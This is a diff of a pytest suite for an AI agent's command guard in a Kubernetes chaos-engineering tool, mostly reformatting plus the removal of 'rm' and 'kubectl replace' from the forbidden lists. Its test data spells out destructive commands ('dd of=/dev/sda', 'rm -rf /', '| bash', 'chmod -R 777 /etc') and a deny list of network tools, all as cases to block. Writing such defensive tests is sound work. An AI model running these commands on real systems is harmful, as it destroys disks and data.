@@ -42,11 +42,24 @@ class TestToolGuardCheck:
     # admitted (a fallback plan is the only path on a cluster without
     # ChaosBlade). Their DANGEROUS forms are still refused, by a per-binary guard
     # instead of the whitelist — see test_guard_single_resource_binaries.py.
+    # ``rm`` left the same way (drill-artifact cleanup tail, _check_rm) — its
+    # recursive/wild forms are pinned in TestRmCleanupTailGuard below.
 
     @pytest.mark.parametrize(
         "cmd_first",
-        ["rm", "curl", "python", "python3", "bash", "sh", "perl",
-         "wget", "pkill", "killall", "socat", "bpftrace"],
+        [
+            "curl",
+            "python",
+            "python3",
+            "bash",
+            "sh",
+            "perl",
+            "wget",
+            "pkill",
+            "killall",
+            "socat",
+            "bpftrace",
+        ],
     )
     def test_forbidden_commands_rejected(self, cmd_first):
         allowed, reason = self.guard.check([cmd_first, "arg1"])
@@ -60,22 +73,45 @@ class TestToolGuardCheck:
 
     # ── kubectl subcommand whitelist ───────────────────────────────────
 
-    @pytest.mark.parametrize("subcmd", ["get", "describe", "delete", "exec", "logs", "top", "patch", "scale", "debug", "wait", "cordon", "uncordon", "taint"])
+    @pytest.mark.parametrize(
+        "subcmd",
+        [
+            "get",
+            "describe",
+            "delete",
+            "exec",
+            "logs",
+            "top",
+            "patch",
+            "scale",
+            "debug",
+            "wait",
+            "cordon",
+            "uncordon",
+            "taint",
+        ],
+    )
     def test_kubectl_allowed_subcommands(self, subcmd):
         allowed, _ = self.guard.check(["kubectl", subcmd, "pods"])
         assert allowed is True
 
-    @pytest.mark.parametrize("subcmd", ["edit", "replace"])
+    @pytest.mark.parametrize("subcmd", ["edit"])
     def test_kubectl_forbidden_subcommands(self, subcmd):
         allowed, reason = self.guard.check(["kubectl", subcmd, "something"])
         assert allowed is False
         assert "subcommand not allowed" in reason
+        # ``replace`` left this list: the PVC/limits/topology cases teach it
+        # as the only exactly-restoring verb (apply's three-way merge keeps
+        # injected fields). Pinned in TestKubectlReplaceRestoreVerb.
 
-    @pytest.mark.parametrize("cmd", [
-        ["kubectl", "label", "node", "n1", "chaos-target=ksm", "--overwrite"],
-        ["kubectl", "label", "node", "n1", "chaos-target-"],
-        ["kubectl", "annotate", "node", "n1", "k=v", "--overwrite"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["kubectl", "label", "node", "n1", "chaos-target=ksm", "--overwrite"],
+            ["kubectl", "label", "node", "n1", "chaos-target-"],
+            ["kubectl", "annotate", "node", "n1", "k=v", "--overwrite"],
+        ],
+    )
     def test_kubectl_metadata_write_verbs_allowed(self, cmd):
         """``label``/``annotate`` are strict subsets of ``patch``.
 
@@ -89,21 +125,34 @@ class TestToolGuardCheck:
         allowed, reason = self.guard.check(cmd)
         assert allowed is True, reason
 
-    @pytest.mark.parametrize("cmd", [
-        ["kubectl", "drain", "n1", "--ignore-daemonsets", "--grace-period=30"],
-        # The exact command from the Node_维护_节点排空Drain skill case.
-        ["kubectl", "drain", "n1", "--ignore-daemonsets",
-         "--delete-emptydir-data", "--grace-period=30", "--timeout=120s"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["kubectl", "drain", "n1", "--ignore-daemonsets", "--grace-period=30"],
+            # The exact command from the Node_维护_节点排空Drain skill case.
+            [
+                "kubectl",
+                "drain",
+                "n1",
+                "--ignore-daemonsets",
+                "--delete-emptydir-data",
+                "--grace-period=30",
+                "--timeout=120s",
+            ],
+        ],
+    )
     def test_kubectl_drain_allowed(self, cmd):
         allowed, reason = self.guard.check(cmd)
         assert allowed is True, reason
 
-    @pytest.mark.parametrize("flag", [
-        "--delete-emptydir-data",
-        "--delete-emptydir-data=true",
-        "--delete-local-data",     # deprecated alias of the same behaviour
-    ])
+    @pytest.mark.parametrize(
+        "flag",
+        [
+            "--delete-emptydir-data",
+            "--delete-emptydir-data=true",
+            "--delete-local-data",  # deprecated alias of the same behaviour
+        ],
+    )
     def test_kubectl_drain_emptydir_flag_allowed(self, flag):
         """An emptyDir dies WITH its pod — losing it is not extra destruction.
 
@@ -117,11 +166,14 @@ class TestToolGuardCheck:
         allowed, reason = self.guard.check(["kubectl", "drain", "n1", flag])
         assert allowed is True, reason
 
-    @pytest.mark.parametrize("flag", [
-        "--disable-eviction",
-        "--force",
-        "--force=true",
-    ])
+    @pytest.mark.parametrize(
+        "flag",
+        [
+            "--disable-eviction",
+            "--force",
+            "--force=true",
+        ],
+    )
     def test_kubectl_drain_unrecoverable_flags_rejected(self, flag):
         """Draining is recoverable; these flags make it not.
 
@@ -171,13 +223,25 @@ class TestToolGuardCheck:
         fb = self.guard.evaluate(["kubectl", "drain", "n1", "--force=true"])
         assert fb.offending == "--force"
 
-    @pytest.mark.parametrize("cmd", [
-        # ``delete --force`` skips graceful termination on ONE explicitly named
-        # pod — a different meaning from drain's "delete unmanaged pods", and
-        # the target guard sees the exact pod. The knowledge base recommends it.
-        ["kubectl", "delete", "pod", "p1", "-n", "ns", "--force", "--grace-period=0"],
-        ["kubectl", "delete", "pod", "p1", "-n", "ns", "--delete-emptydir-data"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # ``delete --force`` skips graceful termination on ONE explicitly named
+            # pod — a different meaning from drain's "delete unmanaged pods", and
+            # the target guard sees the exact pod. The knowledge base recommends it.
+            [
+                "kubectl",
+                "delete",
+                "pod",
+                "p1",
+                "-n",
+                "ns",
+                "--force",
+                "--grace-period=0",
+            ],
+            ["kubectl", "delete", "pod", "p1", "-n", "ns", "--delete-emptydir-data"],
+        ],
+    )
     def test_drain_flag_ban_is_scoped_to_drain(self, cmd):
         """The drain flag ban must not leak onto other subcommands."""
         allowed, reason = self.guard.check(cmd)
@@ -231,17 +295,20 @@ class TestToolGuardCheck:
         for verb in self.guard.systemctl_subcommands:
             assert verb in fb.compliant_form, verb
 
-    @pytest.mark.parametrize("cmd,expected", [
-        (["kill", "-9", "-123", "456"], "-123"),
-        (["kill", "-9", "nginx"], "nginx"),
-        (["kill", "-9", "1"], "1"),
-        (["kill", "-1"], "-1"),
-        (["systemctl", "reboot"], "reboot"),
-        (["chmod", "-R", "777", "/etc"], "-R"),
-        (["kubectl", "edit", "x"], "edit"),
-        (["curl", "http://x"], "curl"),
-        (["dd", "if=/dev/zero", "of=/dev/sda"], "of=/dev/sda"),
-    ])
+    @pytest.mark.parametrize(
+        "cmd,expected",
+        [
+            (["kill", "-9", "-123", "456"], "-123"),
+            (["kill", "-9", "nginx"], "nginx"),
+            (["kill", "-9", "1"], "1"),
+            (["kill", "-1"], "-1"),
+            (["systemctl", "reboot"], "reboot"),
+            (["chmod", "-R", "777", "/etc"], "-R"),
+            (["kubectl", "edit", "x"], "edit"),
+            (["curl", "http://x"], "curl"),
+            (["dd", "if=/dev/zero", "of=/dev/sda"], "of=/dev/sda"),
+        ],
+    )
     def test_rejection_echoes_the_offending_token(self, cmd, expected):
         """``offending`` is the structured copy of what tripped the rule.
 
@@ -268,9 +335,7 @@ class TestToolGuardCheck:
         assert floor.is_hard_floor is True
         assert floor.compliant_form == ""
 
-        cap = self.guard.evaluate(
-            ["dd", "if=/dev/zero", "of=/tmp/f", "count=99999999"]
-        )
+        cap = self.guard.evaluate(["dd", "if=/dev/zero", "of=/tmp/f", "count=99999999"])
         assert cap.is_hard_floor is False
         assert "retry" in cap.compliant_form.lower()
 
@@ -279,23 +344,23 @@ class TestToolGuardCheck:
     # the kill branch ship with a hard_floor flag contradicting its own
     # compliant_form.
     _EVERY_REJECTION = [
-        ["curl", "http://x"],                                  # unknown binary
-        ["kubectl", "edit", "x"],                              # kubectl sub
-        ["kubectl", "config", "use-context", "other"],          # kubectl config
-        ["kubectl", "drain", "n1", "--force"],                  # drain flag
-        ["systemctl", "reboot"],                               # systemctl verb
-        ["systemctl", "--version"],                            # systemctl noverb
-        ["kill", "-1"],                                        # kill broadcast
-        ["kill", "-9", "1"],                                   # kill init
-        ["kill", "-9", "-123", "456"],                         # kill pgid
-        ["kill", "-9", "nginx"],                               # kill non-numeric
-        ["kill", "-9"],                                        # kill no target
-        ["chmod", "-R", "777", "/etc"],                        # chmod recursive
-        ["kubectl", "get", "pods", "|", "wc"],                 # benign pipe
-        ["blade", "create", ";", "rm", "file"],                # solo metachar
-        ["dd", "if=/dev/zero", "of=/dev/sda"],                 # destructive floor
+        ["curl", "http://x"],  # unknown binary
+        ["kubectl", "edit", "x"],  # kubectl sub
+        ["kubectl", "config", "use-context", "other"],  # kubectl config
+        ["kubectl", "drain", "n1", "--force"],  # drain flag
+        ["systemctl", "reboot"],  # systemctl verb
+        ["systemctl", "--version"],  # systemctl noverb
+        ["kill", "-1"],  # kill broadcast
+        ["kill", "-9", "1"],  # kill init
+        ["kill", "-9", "-123", "456"],  # kill pgid
+        ["kill", "-9", "nginx"],  # kill non-numeric
+        ["kill", "-9"],  # kill no target
+        ["chmod", "-R", "777", "/etc"],  # chmod recursive
+        ["kubectl", "get", "pods", "|", "wc"],  # benign pipe
+        ["blade", "create", ";", "rm", "file"],  # solo metachar
+        ["dd", "if=/dev/zero", "of=/dev/sda"],  # destructive floor
         ["dd", "if=/dev/zero", "of=/tmp/f", "count=99999999"],  # magnitude cap
-        [],                                                     # empty command
+        [],  # empty command
     ]
 
     @pytest.mark.parametrize("cmd", _EVERY_REJECTION)
@@ -316,7 +381,12 @@ class TestToolGuardCheck:
         assert fb.allowed is False, cmd
         if fb.is_hard_floor:
             lowered = fb.compliant_form.lower()
-            for retry_word in ("retry", "reshape", "drop the flag", "instead of forcing"):
+            for retry_word in (
+                "retry",
+                "reshape",
+                "drop the flag",
+                "instead of forcing",
+            ):
                 assert retry_word not in lowered, (
                     f"{cmd} is flagged a boundary that will not relax, yet its "
                     f"compliant_form implies editing the same command works: "
@@ -341,22 +411,43 @@ class TestToolGuardCheck:
             assert fb.compliant_form, f"{cmd} is reshapeable but offers no form"
 
     def test_kubectl_with_kubeconfig_flag_passes(self):
-        allowed, _ = self.guard.check([
-            "kubectl", "--kubeconfig", "/my/kubeconfig", "get", "pods", "-n", "default",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "--kubeconfig",
+                "/my/kubeconfig",
+                "get",
+                "pods",
+                "-n",
+                "default",
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_with_context_flag_passes(self):
-        allowed, _ = self.guard.check([
-            "kubectl", "--context", "my-ctx", "get", "nodes",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "--context",
+                "my-ctx",
+                "get",
+                "nodes",
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_with_kubeconfig_forbidden_subcommand(self):
         """Even with --kubeconfig, forbidden subcommands are still rejected."""
-        allowed, reason = self.guard.check([
-            "kubectl", "--kubeconfig", "/my/kubeconfig", "edit", "deployment", "my-app",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "kubectl",
+                "--kubeconfig",
+                "/my/kubeconfig",
+                "edit",
+                "deployment",
+                "my-app",
+            ]
+        )
         assert allowed is False
         assert "subcommand not allowed" in reason
 
@@ -366,23 +457,40 @@ class TestToolGuardCheck:
         assert allowed is True
 
     def test_kubectl_config_view_is_allowed(self):
-        allowed, _ = self.guard.check([
-            "kubectl", "config", "view", "--minify", "-o", "jsonpath={..namespace}",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "config",
+                "view",
+                "--minify",
+                "-o",
+                "jsonpath={..namespace}",
+            ]
+        )
         assert allowed is True
 
-    @pytest.mark.parametrize("action", ["set", "use-context", "set-context", "delete-context"])
+    @pytest.mark.parametrize(
+        "action", ["set", "use-context", "set-context", "delete-context"]
+    )
     def test_kubectl_config_mutations_are_rejected(self, action):
         allowed, reason = self.guard.check(["kubectl", "config", action, "value"])
         assert allowed is False
         assert "read-only" in reason
 
     def test_wiz_wrapped_kubectl_config_view_is_allowed(self):
-        allowed, _ = self.guard.check([
-            "wiz", "task", "exec",
-            "--command", "kubectl config view --minify -o 'jsonpath={..namespace}'",
-            "--cluster-uuid", "cluster", "--profile", "profile",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "wiz",
+                "task",
+                "exec",
+                "--command",
+                "kubectl config view --minify -o 'jsonpath={..namespace}'",
+                "--cluster-uuid",
+                "cluster",
+                "--profile",
+                "profile",
+            ]
+        )
         assert allowed is True
 
     def test_wiz_wrapped_kubectl_config_write_allowed_by_guard(self):
@@ -401,11 +509,19 @@ class TestToolGuardCheck:
         whitelist is intentionally NOT re-applied to avoid
         redundancy with the pre-wrap check.
         """
-        allowed, _ = self.guard.check([
-            "wiz", "task", "exec",
-            "--command", "kubectl config use-context other",
-            "--cluster-uuid", "cluster", "--profile", "profile",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "wiz",
+                "task",
+                "exec",
+                "--command",
+                "kubectl config use-context other",
+                "--cluster-uuid",
+                "cluster",
+                "--profile",
+                "profile",
+            ]
+        )
         assert allowed is True
 
     # ── Parameter blacklist patterns ───────────────────────────────────
@@ -435,9 +551,7 @@ class TestToolGuardCheck:
         The regex blacklist now exempts the null/stdout/stderr/fd pseudo-devices;
         a bare ``>`` token still trips SUSPICIOUS_SOLO_TOKENS above.
         """
-        allowed, reason = self.guard.check(
-            ["kubectl", "get", "pods", "2>/dev/null"]
-        )
+        allowed, reason = self.guard.check(["kubectl", "get", "pods", "2>/dev/null"])
         assert allowed is True, reason
 
     def test_redirect_block_device_glued_still_blocked(self):
@@ -459,184 +573,327 @@ class TestToolGuardCheck:
 
     def test_dd_write_raw_block_device_blocked(self):
         """dd writing to raw block devices (sd) must be blocked."""
-        allowed, reason = self.guard.check([
-            "dd", "if=/dev/zero", "of=/dev/sda", "bs=1M", "count=100",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "dd",
+                "if=/dev/zero",
+                "of=/dev/sda",
+                "bs=1M",
+                "count=100",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
     def test_dd_write_nvme_block_device_blocked(self):
         """dd writing to NVMe block devices must be blocked."""
-        allowed, reason = self.guard.check([
-            "dd", "of=/dev/nvme0n1", "bs=1M",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "dd",
+                "of=/dev/nvme0n1",
+                "bs=1M",
+            ]
+        )
         assert allowed is False
 
     def test_fio_write_raw_block_device_blocked(self):
         """fio writing to raw block devices must be blocked."""
-        allowed, reason = self.guard.check([
-            "fio", "--filename=/dev/sda", "--rw=write",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "fio",
+                "--filename=/dev/sda",
+                "--rw=write",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
-    @pytest.mark.parametrize("device", [
-        "/dev/mapper/vg--root",  # LVM logical volume (common server root)
-        "/dev/dm-0",             # device-mapper node
-        "/dev/md0",              # software RAID
-        "/dev/mmcblk0",          # eMMC / embedded flash
-        "/dev/loop0",            # loopback device
-        "/dev/dasda",            # mainframe DASD
-        "/dev/nbd0",             # network block device
-        "/dev/rbd0",             # Ceph RBD — common as a k8s PV backend
-    ])
+    @pytest.mark.parametrize(
+        "device",
+        [
+            "/dev/mapper/vg--root",  # LVM logical volume (common server root)
+            "/dev/dm-0",  # device-mapper node
+            "/dev/md0",  # software RAID
+            "/dev/mmcblk0",  # eMMC / embedded flash
+            "/dev/loop0",  # loopback device
+            "/dev/dasda",  # mainframe DASD
+            "/dev/nbd0",  # network block device
+            "/dev/rbd0",  # Ceph RBD — common as a k8s PV backend
+        ],
+    )
     def test_dd_write_managed_block_device_blocked(self, device):
         """dd writing to LVM/RAID/eMMC/loop/DASD must be blocked too.
 
         Regression guard for the disk-destruction bypass: the old regex only
         matched bare disks (sd/nvme/...), leaving /dev/mapper (LVM) exposed.
         """
-        allowed, reason = self.guard.check([
-            "dd", "if=/dev/zero", f"of={device}", "bs=1M", "count=100",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "dd",
+                "if=/dev/zero",
+                f"of={device}",
+                "bs=1M",
+                "count=100",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
-    @pytest.mark.parametrize("device", [
-        "/dev/mapper/vg--root",
-        "/dev/dm-0",
-        "/dev/md0",
-        "/dev/mmcblk0",
-        "/dev/nbd0",
-        "/dev/rbd0",
-    ])
+    @pytest.mark.parametrize(
+        "device",
+        [
+            "/dev/mapper/vg--root",
+            "/dev/dm-0",
+            "/dev/md0",
+            "/dev/mmcblk0",
+            "/dev/nbd0",
+            "/dev/rbd0",
+        ],
+    )
     def test_fio_write_managed_block_device_blocked(self, device):
         """fio writing to LVM/RAID/eMMC must be blocked too."""
-        allowed, reason = self.guard.check([
-            "fio", f"--filename={device}", "--rw=write",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "fio",
+                f"--filename={device}",
+                "--rw=write",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
     def test_dd_write_normal_file_allowed(self):
         """dd writing to regular files is allowed (legitimate disk-fill use)."""
-        allowed, _ = self.guard.check([
-            "dd", "if=/dev/zero", "of=/tmp/fill", "bs=1M", "count=100",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "dd",
+                "if=/dev/zero",
+                "of=/tmp/fill",
+                "bs=1M",
+                "count=100",
+            ]
+        )
         assert allowed is True
 
     def test_dd_read_from_block_device_allowed(self):
         """dd reading from block devices (if=) is allowed — only writes are blocked."""
-        allowed, _ = self.guard.check([
-            "dd", "if=/dev/sda", "of=/tmp/backup", "bs=1M", "count=10",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "dd",
+                "if=/dev/sda",
+                "of=/tmp/backup",
+                "bs=1M",
+                "count=10",
+            ]
+        )
         assert allowed is True
 
     def test_dd_excessive_count_blocked(self):
         """dd with unreasonably large count (7+ digits) must be blocked."""
-        allowed, reason = self.guard.check([
-            "dd", "if=/dev/zero", "of=/tmp/fill", "bs=1M", "count=9999999",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "dd",
+                "if=/dev/zero",
+                "of=/tmp/fill",
+                "bs=1M",
+                "count=9999999",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
     def test_dd_normal_count_allowed(self):
         """dd with reasonable count (6 digits) is allowed."""
-        allowed, _ = self.guard.check([
-            "dd", "if=/dev/zero", "of=/tmp/fill", "bs=1M", "count=100000",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "dd",
+                "if=/dev/zero",
+                "of=/tmp/fill",
+                "bs=1M",
+                "count=100000",
+            ]
+        )
         assert allowed is True
 
     def test_fio_excessive_runtime_blocked(self):
         """fio with unreasonably large --runtime (7+ digits) must be blocked."""
-        allowed, reason = self.guard.check([
-            "fio", "--filename=/tmp/test", "--runtime=9999999",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "fio",
+                "--filename=/tmp/test",
+                "--runtime=9999999",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
     # ── Normal commands not triggering blacklist ───────────────────────
 
     def test_normal_blade_create_passes(self):
-        allowed, _ = self.guard.check([
-            "blade", "create", "pod", "network", "delay",
-            "--time", "3000", "--interface", "eth0",
-            "--names", "my-pod", "--namespace", "default",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "blade",
+                "create",
+                "pod",
+                "network",
+                "delay",
+                "--time",
+                "3000",
+                "--interface",
+                "eth0",
+                "--names",
+                "my-pod",
+                "--namespace",
+                "default",
+            ]
+        )
         assert allowed is True
 
     def test_normal_kubectl_get_passes(self):
-        allowed, _ = self.guard.check([
-            "kubectl", "get", "pods", "-n", "default", "-o", "json",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "get",
+                "pods",
+                "-n",
+                "default",
+                "-o",
+                "json",
+            ]
+        )
         assert allowed is True
 
     # ── kubectl patch -p payload exclusion ─────────────────────────────
 
     def test_kubectl_patch_json_payload_with_dollar_paren_allowed(self):
         """kubectl patch -p value contains $( but it's JSON data, not shell injection."""
-        allowed, _ = self.guard.check([
-            "kubectl", "patch", "pvc", "my-pvc", "-n", "default",
-            "-p", '{"spec":{"storageClassName":"$(whoami)"}}',
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "pvc",
+                "my-pvc",
+                "-n",
+                "default",
+                "-p",
+                '{"spec":{"storageClassName":"$(whoami)"}}',
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_patch_json_payload_with_backticks_allowed(self):
         """kubectl patch -p value contains backticks but it's JSON data."""
-        allowed, _ = self.guard.check([
-            "kubectl", "patch", "deployment", "my-deploy", "-n", "default",
-            "-p", '{"spec":{"template":{"`unused`":"value"}}}',
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "deployment",
+                "my-deploy",
+                "-n",
+                "default",
+                "-p",
+                '{"spec":{"template":{"`unused`":"value"}}}',
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_patch_equals_syntax_payload_excluded(self):
         """kubectl patch -p=VALUE syntax: payload value is excluded from check."""
-        allowed, _ = self.guard.check([
-            "kubectl", "patch", "pvc", "my-pvc", "-n", "default",
-            "-p={'spec':{'storageClassName':'$(dangerous)'}}",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "pvc",
+                "my-pvc",
+                "-n",
+                "default",
+                "-p={'spec':{'storageClassName':'$(dangerous)'}}",
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_patch_long_flag_payload_excluded(self):
         """kubectl patch --patch=VALUE syntax: payload value is excluded."""
-        allowed, _ = self.guard.check([
-            "kubectl", "patch", "pvc", "my-pvc", "-n", "default",
-            "--patch={'spec':{'storageClassName':'$(dangerous)'}}",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "pvc",
+                "my-pvc",
+                "-n",
+                "default",
+                "--patch={'spec':{'storageClassName':'$(dangerous)'}}",
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_patch_dangerous_in_host_part_still_blocked(self):
         """Dangerous patterns outside -p value (in host part) are still blocked."""
-        allowed, reason = self.guard.check([
-            "kubectl", "patch", "pvc", "my-pvc", "-n", "default",
-            "-p", '{"spec":{}}', "| bash",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "pvc",
+                "my-pvc",
+                "-n",
+                "default",
+                "-p",
+                '{"spec":{}}',
+                "| bash",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
     def test_kubectl_patch_normal_payload_passes(self):
         """Normal kubectl patch with safe JSON payload passes."""
-        allowed, _ = self.guard.check([
-            "kubectl", "patch", "deployment", "my-deploy", "-n", "default",
-            "-p", '{"spec":{"replicas":0}}',
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "deployment",
+                "my-deploy",
+                "-n",
+                "default",
+                "-p",
+                '{"spec":{"replicas":0}}',
+            ]
+        )
         assert allowed is True
 
     # ── kubectl exec -- container command exclusion ─────────────────────
 
     def test_kubectl_exec_dangerous_in_container_allowed(self):
         """Dangerous patterns after -- (container command) are allowed."""
-        allowed, _ = self.guard.check([
-            "kubectl", "exec", "my-pod", "-n", "default", "--",
-            "blade", "create", "k8s", "pod-cpu", "fullload",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "exec",
+                "my-pod",
+                "-n",
+                "default",
+                "--",
+                "blade",
+                "create",
+                "k8s",
+                "pod-cpu",
+                "fullload",
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_exec_dangerous_before_separator_blocked(self):
         """Dangerous patterns before -- (host part) are still blocked."""
-        allowed, reason = self.guard.check([
-            "kubectl", "exec", "| bash", "--", "echo", "hi",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "kubectl",
+                "exec",
+                "| bash",
+                "--",
+                "echo",
+                "hi",
+            ]
+        )
         assert allowed is False
         assert "Dangerous pattern" in reason
 
@@ -656,10 +913,21 @@ class TestToolGuardCheck:
         ``-- sh -c "ps aux | grep mem"`` (already worked: the ``|``
         sits inside a single quoted token).
         """
-        allowed, _ = self.guard.check([
-            "kubectl", "exec", "chaosblade-tool-xxxx", "-n", "chaosblade",
-            "--", "ps", "aux", "|", "grep", "mem",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "exec",
+                "chaosblade-tool-xxxx",
+                "-n",
+                "chaosblade",
+                "--",
+                "ps",
+                "aux",
+                "|",
+                "grep",
+                "mem",
+            ]
+        )
         assert allowed is True
 
     @pytest.mark.parametrize("solo", [";", "|", "&", "||", "&&", ">", "<"])
@@ -671,9 +939,20 @@ class TestToolGuardCheck:
         every token in the set so a future tightening that re-checks
         cmd-wide surfaces here, not just for ``|``.
         """
-        allowed, _ = self.guard.check([
-            "kubectl", "exec", "pod", "--", "sh", "-c", "true", solo, "echo", "x",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "exec",
+                "pod",
+                "--",
+                "sh",
+                "-c",
+                "true",
+                solo,
+                "echo",
+                "x",
+            ]
+        )
         assert allowed is True
 
     def test_kubectl_solo_pipe_outside_exec_still_blocked(self):
@@ -696,9 +975,7 @@ class TestToolGuardCheck:
         command-agnostic heuristic (fetch output, post-process yourself) rather
         than an opaque 'dangerous' verdict — no per-tool advice map. The model
         reasons out the native alternative itself, for ANY ``| filter``."""
-        allowed, reason = self.guard.check(
-            ["kubectl", "get", "pods", "|", "wc", "-l"]
-        )
+        allowed, reason = self.guard.check(["kubectl", "get", "pods", "|", "wc", "-l"])
         assert allowed is False
         assert "Dangerous pattern" not in reason
         assert "yourself" in reason  # command-agnostic heuristic core
@@ -725,28 +1002,51 @@ class TestToolGuardCheck:
         """E11: --field-selector value is a payload, not a shell command.
         Old host_part regex would have joined and could mis-detect; new
         parser puts it in data_payload_values so it's skipped."""
-        allowed, _ = self.guard.check([
-            "kubectl", "get", "pods",
-            "--field-selector", "status.phase=Running",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "get",
+                "pods",
+                "--field-selector",
+                "status.phase=Running",
+            ]
+        )
         assert allowed is True
 
     def test_blade_subcommand_parsed_correctly(self):
         """E11: blade AST parser identifies subcommand + value flags
         without consuming positional args."""
-        allowed, _ = self.guard.check([
-            "blade", "create", "pod", "network", "delay",
-            "--time", "3000", "--interface", "eth0",
-            "--names", "my-pod", "--namespace", "default",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "blade",
+                "create",
+                "pod",
+                "network",
+                "delay",
+                "--time",
+                "3000",
+                "--interface",
+                "eth0",
+                "--names",
+                "my-pod",
+                "--namespace",
+                "default",
+            ]
+        )
         assert allowed is True
 
     def test_unknown_kubectl_flag_treated_as_value_taking(self):
         """E11: unknown flag consumes next token (conservative
         fallback). Subcommand + remaining positional still parsed."""
-        allowed, _ = self.guard.check([
-            "kubectl", "get", "--made-up-future-flag", "value", "pods",
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "get",
+                "--made-up-future-flag",
+                "value",
+                "pods",
+            ]
+        )
         # Should still pass: 'get' is allowed, no dangerous patterns
         assert allowed is True
 
@@ -757,6 +1057,7 @@ class TestToolGuardCheck:
         a future check that depends on positional_args being correct
         would silently break."""
         from chaos_agent.tools.guard_parser import parse_command
+
         p = parse_command(["blade", "create", "-h", "pod"])
         assert p.subcommand == "create"
         assert "pod" in p.positional_args
@@ -768,6 +1069,7 @@ class TestToolGuardCheck:
         would become a bypass channel for shell-pattern checks on
         anything that follows."""
         from chaos_agent.tools.guard_parser import parse_command
+
         p = parse_command(["kubectl", "get", "--", "pod"])
         assert p.subcommand == "get"
         assert p.container_command == ()
@@ -794,16 +1096,24 @@ class TestToolGuardCheck:
         it so a future revert of the AST parser would surface here
         instead of silently regressing real LLM-generated commands.
         """
-        allowed, reason = self.guard.check([
-            "kubectl", "--insecure-skip-tls-verify", "get", "pods",
-        ])
+        allowed, reason = self.guard.check(
+            [
+                "kubectl",
+                "--insecure-skip-tls-verify",
+                "get",
+                "pods",
+            ]
+        )
         assert allowed is True, f"expected allow, got: {reason}"
 
-    @pytest.mark.parametrize("boolean_flag", [
-        "--insecure-skip-tls-verify",
-        "--help",
-        "-h",
-    ])
+    @pytest.mark.parametrize(
+        "boolean_flag",
+        [
+            "--insecure-skip-tls-verify",
+            "--help",
+            "-h",
+        ],
+    )
     def test_kubectl_boolean_flag_before_subcommand(self, boolean_flag):
         """Parameterized companion to the regression above — every
         kubectl global boolean flag must allow subcommand to be
@@ -829,10 +1139,17 @@ class TestToolGuardCheck:
         promotes container_command into host_relevant_tokens, this
         test flips to FAIL.
         """
-        allowed, _ = self.guard.check([
-            "kubectl", "exec", "pod", "--",
-            "sh", "-c", "rm -rf /",  # single token "rm -rf /" matches rm\s+-rf
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "exec",
+                "pod",
+                "--",
+                "sh",
+                "-c",
+                "rm -rf /",  # single token "rm -rf /" matches rm\s+-rf
+            ]
+        )
         assert allowed is True
 
     def test_data_payload_with_dangerous_single_token_allowed(self):
@@ -843,10 +1160,18 @@ class TestToolGuardCheck:
         the regex, so a future change that leaks payload values into
         host_relevant_tokens would surface here.
         """
-        allowed, _ = self.guard.check([
-            "kubectl", "patch", "pvc", "x", "-n", "default",
-            "-p", '{"spec":{"x":"rm -rf /"}}',  # single token contains rm -rf
-        ])
+        allowed, _ = self.guard.check(
+            [
+                "kubectl",
+                "patch",
+                "pvc",
+                "x",
+                "-n",
+                "default",
+                "-p",
+                '{"spec":{"x":"rm -rf /"}}',  # single token contains rm -rf
+            ]
+        )
         assert allowed is True
 
 
@@ -933,13 +1258,16 @@ class TestToolGuardHostWhitelist:
 
     # ── Tier 1 — low-risk, single-command, admitted directly ───────────
 
